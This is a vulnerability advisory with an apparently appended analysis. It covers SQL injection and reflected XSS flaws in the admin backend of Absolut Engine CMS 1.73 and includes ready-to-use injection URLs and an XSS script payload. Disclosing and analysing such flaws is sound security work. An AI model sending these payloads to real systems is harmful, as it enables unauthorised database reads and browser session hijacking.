Advisory: Multiple SQL Injections and Reflecting XSS in Absolut Engine v. 1.73 CMS
Advisory ID: SROEADV-2014-08
Author: Steffen Rösemann
Affected Software: CMS Absolut Engine v. 1.73
Vendor URL: http://www.absolutengine.com/
Vendor Status: solved
CVE-ID: -

Vulnerability Description:
The (not actively developed) CMS Absolut Engine v. 1.73 has multiple SQL injection vulnerabilities and a XSS vulnerability in its administrative backend.

Technical Details:
The following PHP-Scripts are prone to SQL injections:
* managersection.php (via sectionID parameter):
  * Exploit Example:
    http://{TARGET}/admin/managersection.php?&username=admin&session=c8d7ebc95b9b1a72d3b54eb59bea56c7&sectionID=1'+and+1=2+union+select+1,version(),3,4,5,6+--+*
* edituser.php (via userID parameter):
  * Exploit Example:
    http://{TARGET}/admin/edituser.php?username=admin&session=c8d7ebc95b9b1a72d3b54eb59bea56c7&userID=3'+and+1=2+union+select+1,user(),3,version(),5,database(),7,8,9+--+*
* admin.php (via username parameter, BlindSQLInjection):
  * Exploit Example:
    http://{TARGET}/admin/admin.php?username=admin'+and+substring(user(),1,4)='root'+--+&session=c8d7ebc95b9b1a72d3b54eb59bea56c7*
* managerrelated.php (via title parameter):
  * Exploit Example:
     http://{TARGET}/admin/managerrelated.php?username=user&session=ae29000d8570273c8917e874d029b336&articleID=0&title={some_title}'+and+1=2+union+select+1,version(),3,4,5,6,7,8,9,10,11,12+--+*
The last PHP-Script is as well vulnerable to a Reflecting XSS vulnerability.
* Exploit Example:
    http://{TARGET}/admin/managerrelated.php?username=user&session=ae29000d8570273c8917e874d029b336&articleID=0&title="><script>alert('XSS')</script>*

Solution:
As the CMS is not actively developed, it shouldn't be used anymore.

Based on the provided content, here's a breakdown of the vulnerabilities:

**Root cause of vulnerability:**
- Improper sanitization of user-supplied input in several PHP scripts within the administrative backend of Absolut Engine v. 1.73 CMS.

**Weaknesses/vulnerabilities present:**
- Multiple SQL Injection vulnerabilities
  - `managersection.php` is vulnerable via the `sectionID` parameter.
  - `edituser.php` is vulnerable via the `userID` parameter.
  - `admin.php` is vulnerable via the `username` parameter (Blind SQL Injection).
  - `managerrelated.php` is vulnerable via the `title` parameter.
- Reflecting Cross-Site Scripting (XSS) vulnerability
  - `managerrelated.php` is vulnerable via the `title` parameter.

**Impact of exploitation:**
- SQL Injection:
    - Data exfiltration (retrieval of sensitive information)
    - Potential database manipulation or modification
    - Possibility of privilege escalation
    - Could lead to complete compromise of the web application
- Reflected XSS:
    - Could allow execution of arbitrary JavaScript code in the victim's browser
    - Could lead to session hijacking, cookie theft, or phishing attacks

**Attack vectors:**
- HTTP GET requests to vulnerable PHP scripts within the CMS administrative panel.
- Malicious SQL code injected via URL parameters.
- Malicious JavaScript injected via URL parameters.

**Required attacker capabilities/position:**
- Network connectivity to the target web application.
- Knowledge of the administrative panel paths and parameters within the Absolut Engine CMS.
- For SQL injection, a basic understanding of SQL syntax is required.
- For XSS, knowledge of HTML and JavaScript is needed.
- For the admin.php Blind SQL Injection, the attacker must be able to make multiple requests to determine the information.
